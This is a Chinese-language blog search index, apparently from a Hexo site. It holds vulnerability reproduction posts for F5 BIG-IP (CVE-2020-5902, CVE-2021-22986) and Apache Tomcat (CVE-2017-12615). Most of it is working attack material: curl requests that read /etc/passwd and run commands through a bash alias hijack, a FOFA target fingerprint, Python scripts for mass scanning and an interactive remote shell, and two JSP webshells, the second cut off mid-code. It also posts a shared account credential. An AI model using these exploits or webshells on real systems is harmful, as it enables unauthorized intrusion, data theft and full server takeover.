<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>F5 BIG-IP 远程代码执行漏洞</title>
    <url>/2021/08/25/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p>未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 <code>F5 BIG-IP</code> 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。</p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BIG-IP 15.x: 15.1.0/15.0.0</span><br><span class="line">BIG-IP 14.x: 14.1.0 ~ 14.1.2</span><br><span class="line">BIG-IP 13.x: 13.1.0 ~ 13.1.3</span><br><span class="line">BIG-IP 12.x: 12.1.0 ~ 12.1.5</span><br><span class="line">BIG-IP 11.x: 11.6.1 ~ 11.6.5</span><br></pre></td></tr></table></figure>

<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icon_hash=&quot;-335242539&quot;</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在官网下载vmware文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://downloads.f5.com/esd/ecc.sv?sw=BIG-IP&amp;pro=big-ip_v15.x&amp;ver=15.1.0&amp;container=Virtual-Edition</span><br></pre></td></tr></table></figure>

<p>直接访问会跳转，需要注册个账号。或者直接使用以下账户进行登陆。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F5登录账号：john12334@027168.com/John12334</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826200911098.png" alt="image-20210826200911098"></p>
<p>登陆成功后，下载ova文件格式</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826200932855.png" alt="image-20210826200932855"></p>
<p>导入Vmware:文件–&gt;打开–&gt;下一步导入虚拟机。导入后直接启动，使用系统默认账户：root/default登陆，随后修改默认密码。最后ifconfig。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826200958844.png" alt="image-20210826200958844"></p>
<p>浏览器访问：<a href="https://192.168.240.147/tmui/login.jsp">https://192.168.240.147/tmui/login.jsp</a></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826201104572.png" alt="image-20210826201104572"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="F5-BIG-IP-远程代码执行漏洞-CVE-2020-5902"><a href="#F5-BIG-IP-远程代码执行漏洞-CVE-2020-5902" class="headerlink" title="F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902"></a>F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902</h3><p><a href="https://github.com/jas502n/CVE-2020-5902">详情利用方式 https://github.com/jas502n/CVE-2020-5902</a></p>
<p><a href="https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md">详情利用方式 https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md</a></p>
<p>漏洞验证：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 浏览器中访问</span><br><span class="line">https://192.168.240.147/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826201137886.png" alt="image-20210826201137886"></p>
<p>执行tmsh命令；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&quot;</span><br><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&quot;</span><br></pre></td></tr></table></figure>

<p>写入文件；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -X POST -d &quot;fileName=/tmp/success&amp;content=CVE-2020-5902&quot; &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp&quot;</span><br></pre></td></tr></table></figure>

<p>读取文件；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/success&quot;</span><br></pre></td></tr></table></figure>

<p>修改alias劫持list命令为bash；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash&quot;</span><br><span class="line"># 写入bash文件</span><br><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test&amp;content=id&quot;</span><br><span class="line"># 执行bash文件</span><br><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/test&quot;</span><br><span class="line"># 还原list命令</span><br><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list&quot;</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2020-5902漏洞POC"><a href="#CVE-2020-5902漏洞POC" class="headerlink" title="CVE-2020-5902漏洞POC"></a>CVE-2020-5902漏洞POC</h3><p>测试是否存在有此漏洞；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mPOC_Des: 拾玖的猫                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mGithub : 拾玖的猫                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34m公众号 : 小拾玖的猫                                                     \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mVersion: F5 BIG-IP                                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36m使用格式: python3 CVE-2020-5902.py                                  \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    version_url = target_url + &quot;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;,</span><br><span class="line">        &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=version_url, timeout=10, verify=False, headers=headers)</span><br><span class="line">        if &quot;output&quot; in response.text:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125; 存在漏洞，响应为:\n&#123;&#125;\033[0m&quot;.format(target_url, json.loads(response.text)[&quot;output&quot;]))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[31m[x] 目标漏洞无法利用 \033[0m&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标漏洞无法利用 ,&#123;&#125;\033[0m&quot;.format(e))</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure>

<h3 id="F5-BIG-IP-远程代码执行漏洞-CVE-2021-22986"><a href="#F5-BIG-IP-远程代码执行漏洞-CVE-2021-22986" class="headerlink" title="F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986"></a>F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986</h3><p>漏洞验证，访问如下页面。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826201205590.png" alt="image-20210826201205590"></p>
<p>通过burp修改请求包；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx:8443</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 41</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826201222529.png" alt="image-20210826201222529"></p>
<p>成功执行命令id；</p>
<h3 id="CVE-2021-22986漏洞POC"><a href="#CVE-2021-22986漏洞POC" class="headerlink" title="CVE-2021-22986漏洞POC"></a>CVE-2021-22986漏洞POC</h3><p>1.批量测试漏洞IP站点POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line">import json</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mPOC_Des: 小拾玖的猫                                            \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mGithub : 小拾玖的猫                                                  \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34m公众号  : 小拾玖的猫                                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mVersion: F5 BIG-IP                                                  \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    vuln_url = target_url + &quot;/mgmt/tm/util/bash&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Authorization&quot;: &quot;Basic YWRtaW46QVNhc1M=&quot;,</span><br><span class="line">        &quot;X-F5-Auth-Token&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#x27;&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=2)</span><br><span class="line">        if &quot;commandResult&quot; in response.text and response.status_code == 200:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞,响应为:&#123;&#125; \033[0m&quot;.format(target_url, json.loads(response.text)[&quot;commandResult&quot;]))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;.format(target_url))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;.format(target_url))</span><br><span class="line"></span><br><span class="line">def Scan(file_name):</span><br><span class="line">    with open(file_name, &quot;r&quot;, encoding=&#x27;utf8&#x27;) as scan_url:</span><br><span class="line">        for url in scan_url:</span><br><span class="line">            if url[:4] != &quot;http&quot;:</span><br><span class="line">                url = &quot;https://&quot; + url</span><br><span class="line">            url = url.strip(&#x27;\n&#x27;)</span><br><span class="line">            try:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(&quot;\033[31m[x] 请求报错 \033[0m&quot;.format(e))</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = str(input(&quot;\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>

<p>2.命令执行POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line">import json</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mPOC_Des: 小拾玖的猫                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mGithub : 小拾玖的猫                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34m公众号  : 小拾玖的猫                                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mVersion: F5 BIG-IP                                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    vuln_url = target_url + &quot;/mgmt/tm/util/bash&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Authorization&quot;: &quot;Basic YWRtaW46QVNhc1M=&quot;,</span><br><span class="line">        &quot;X-F5-Auth-Token&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#x27;&#x27;&#x27;&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c &#x27;cat /etc/passwd&#x27;&quot;&#125;&#x27;&#x27;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)</span><br><span class="line">        if &#x27;root&#x27; in response.text and response.status_code == 200:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞,响应为:&#123;&#125; \033[0m&quot;.format(target_url, json.loads(response.text)[&quot;commandResult&quot;]))</span><br><span class="line">            while True:</span><br><span class="line">                Cmd = str(input(&quot;\033[35mCmd &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">                POC_2(target_url, Cmd)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;.format(target_url))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;.format(target_url), e)</span><br><span class="line"></span><br><span class="line">def POC_2(target_url, Cmd):</span><br><span class="line">    vuln_url = target_url + &quot;/mgmt/tm/util/bash&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Authorization&quot;: &quot;Basic YWRtaW46QVNhc1M=&quot;,</span><br><span class="line">        &quot;X-F5-Auth-Token&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    Cmd = &quot;&#x27;&quot; + Cmd + &quot;&#x27;&quot;</span><br><span class="line">    data = &#x27;&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c %s&quot;&#125;&#x27; % Cmd</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)</span><br><span class="line">        print(&quot;\033[32m&#123;&#125; \033[0m&quot;.format(json.loads(response.text)[&quot;commandResult&quot;]))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 命令执行失败 \033[0m&quot;.format(target_url), e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB-RCE</category>
      </categories>
  </entry>
  <entry>
    <title>Tomcat 任意上传漏洞(CVE-2017-12615)</title>
    <url>/2021/08/25/Tomcat%20%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(CVE-2017-12615)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p>2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，其中就有远程代码执行漏洞(CVE-2017-12615)。当 启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Tomcat 7.0.0 - 7.0.81</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>1. docker搭建；</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/tomcat/CVE-2017-12615</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>访问 <a href="http://xxx.xxx.xxx.xxx:8080/">http://xxx.xxx.xxx.xxx:8080/</a> 正常即可;</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826203327824.png" alt="image-20210826203327824"></p>
<p><strong>2. windows搭建；</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境：</span><br><span class="line">windows 7/Java1.8.0/tomcat7.0.70</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/maoning/p/10701349.html">安装Java环境</a>;</p>
<p>安装tomcat环境;<a href="https://github.com/apache/tomcat/releases">tomcat历史版本下载</a></p>
<p>进入apache-tomcat-7.0.70\bin文件并新起cmd执行；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">startup.bat</span><br></pre></td></tr></table></figure>

<p><a href="https://gblfy.blog.csdn.net/article/details/90493722">报错解决</a>：</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826203910827.png" alt="image-20210826203910827"></p>
<p>在setclasspath.bat（Linux为setclasspath.sh,并将set改为export）的开头手动添加环境变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set JAVA_HOME=C:\Program Files (x86)\Java\bin</span><br><span class="line">set JRE_HOME=C:\Program Files (x86)\Java\jre</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204131112.png" alt="image-20210826204131112"></p>
<p>保存后再次cmd执行；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">startup.bat</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204220268.png" alt="image-20210826204220268"></p>
<p>环境启动成功。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞产生的主要原因来自于<strong>conf/web.xml</strong>文件配置错误,readonly开启了false,导致可以使用<strong>PUT/DELETE</strong>请求方法操作文件；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204703445.png" alt="image-20210826204703445"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>浏览器打开<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204406230.png" alt="image-20210826204406230"></p>
<p>浏览器中刷新一下页面，brup中将会捕获到流量；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204431390.png" alt="image-20210826204431390"></p>
<p>使用PUT请求方式写入hacker.jsp webshell，如下图操作；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204445757.png" alt="image-20210826204445757"></p>
<p>hacker.jsp如下；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span><br><span class="line"></span><br><span class="line">+&quot;\\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;safedog&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;</span><br></pre></td></tr></table></figure>

<p>Response中返回HTTP/1.1 201 Created，说明文件创建成功。</p>
<p>浏览器访问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.40.137:8080/hacker.jsp?pwd=safedog&amp;cmd=ipconfig</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204538095.png" alt="image-20210826204538095"></p>
<h3 id="漏洞验证脚本"><a href="#漏洞验证脚本" class="headerlink" title="漏洞验证脚本"></a>漏洞验证脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/ianxtianxt/CVE-2017-12615</span><br></pre></td></tr></table></figure>



<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>（需使用菜刀链接）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /webshell.jsp/ HTTP/1.1  </span><br><span class="line">Host: 127.0.0.1:8080  </span><br><span class="line">Content-Length: 6239  </span><br><span class="line">&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;  </span><br><span class="line">&lt;%!  </span><br><span class="line">  String Pwd = &quot;hetian&quot;;  </span><br><span class="line">  String cs = &quot;UTF-8&quot;;  </span><br><span class="line">   String EC(String s) throws Exception &#123;  </span><br><span class="line">       return new String(s.getBytes(&quot;ISO-8859-1&quot;),cs);  </span><br><span class="line">   &#125;  </span><br><span class="line">   Connection GC(String s) throws Exception &#123;  </span><br><span class="line">       String[] x = s.trim().split(&quot;choraheiheihei&quot;);  </span><br><span class="line">     Class.forName(x[0].trim());  </span><br><span class="line">      if(x[1].indexOf(&quot;jdbc:oracle&quot;)!=-1)&#123;  </span><br><span class="line">          return DriverManager.getConnection(x[1].trim()+&quot;:&quot;+x[4],x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);  </span><br><span class="line">      &#125;else&#123;  </span><br><span class="line">          Connection c = DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);  </span><br><span class="line">        if (x.length &gt; 4) &#123;  </span><br><span class="line">              c.setCatalog(x[4]);  </span><br><span class="line">          &#125;  </span><br><span class="line">          return c;  </span><br><span class="line">       &#125;  </span><br><span class="line">   &#125;  </span><br><span class="line">  void AA(StringBuffer sb) throws Exception &#123;  </span><br><span class="line">      File k = new File(&quot;&quot;);  </span><br><span class="line">      File r[] = k.listRoots();  </span><br><span class="line">       for (int i = 0; i &lt; r.length; i++) &#123;  </span><br><span class="line">         sb.append(r[i].toString().substring(0, 2));  </span><br><span class="line">     &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">   void BB(String s, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">       File oF = new File(s), l[] = oF.listFiles();  </span><br><span class="line">     String sT, sQ, sF = &quot;&quot;;  </span><br><span class="line">        java.util.Date dt;  </span><br><span class="line">      SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);  </span><br><span class="line">     for (int i = 0; i &lt; l.length; i++) &#123;  </span><br><span class="line">          dt = new java.util.Date(l[i].lastModified());  </span><br><span class="line">           sT = fm.format(dt);  </span><br><span class="line">           sQ = l[i].canRead() ? &quot;R&quot; : &quot;&quot;;  </span><br><span class="line">           sQ += l[i].canWrite() ? &quot; W&quot; : &quot;&quot;;  </span><br><span class="line">           if (l[i].isDirectory()) &#123;  </span><br><span class="line">               sb.append(l[i].getName() + &quot;/\t&quot; + sT + &quot;\t&quot; + l[i].length()+ &quot;\t&quot; + sQ + &quot;\n&quot;);  </span><br><span class="line">          &#125; else &#123;  </span><br><span class="line">               sF+=l[i].getName() + &quot;\t&quot; + sT + &quot;\t&quot; + l[i].length() + &quot;\t&quot;+ sQ + &quot;\n&quot;;  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">       sb.append(sF);  </span><br><span class="line">   &#125;  </span><br><span class="line">   void EE(String s) throws Exception &#123;  </span><br><span class="line">       File f = new File(s);  </span><br><span class="line">      if (f.isDirectory()) &#123;  </span><br><span class="line">           File x[] = f.listFiles();  </span><br><span class="line">           for (int k = 0; k &lt; x.length; k++) &#123;  </span><br><span class="line">               if (!x[k].delete()) &#123;  </span><br><span class="line">                  EE(x[k].getPath());  </span><br><span class="line">               &#125;  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">      f.delete();  </span><br><span class="line">&#125;  </span><br><span class="line">  void FF(String s, HttpServletResponse r) throws Exception &#123;  </span><br><span class="line">       int n;  </span><br><span class="line">     byte[] b = new byte[512];  </span><br><span class="line">     r.reset();  </span><br><span class="line">     ServletOutputStream os = r.getOutputStream();  </span><br><span class="line">       BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));  </span><br><span class="line">       os.write((&quot;-&gt;&quot; + &quot;|&quot;).getBytes(), 0, 3);  </span><br><span class="line">      while ((n = is.read(b, 0, 512)) != -1) &#123;  </span><br><span class="line">           os.write(b, 0, n);  </span><br><span class="line">     &#125;  </span><br><span class="line">   os.write((&quot;|&quot; + &quot;&lt;-&quot;).getBytes(), 0, 3);  </span><br><span class="line">       os.close();  </span><br><span class="line">     is.close();  </span><br><span class="line">  &#125;  </span><br><span class="line">  void GG(String s, String d) throws Exception &#123;  </span><br><span class="line">     String h = &quot;0123456789ABCDEF&quot;;  </span><br><span class="line">      File f = new File(s);  </span><br><span class="line">      f.createNewFile();  </span><br><span class="line">     FileOutputStream os = new FileOutputStream(f);  </span><br><span class="line">      for (int i = 0; i &lt; d.length(); i += 2) &#123;  </span><br><span class="line">        os.write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d.charAt(i + 1))));  </span><br><span class="line">     &#125;  </span><br><span class="line">    os.close();  </span><br><span class="line">  &#125;  </span><br><span class="line">  void HH(String s, String d) throws Exception &#123;  </span><br><span class="line">      File sf = new File(s), df = new File(d);  </span><br><span class="line">       if (sf.isDirectory()) &#123;  </span><br><span class="line">          if (!df.exists()) &#123;  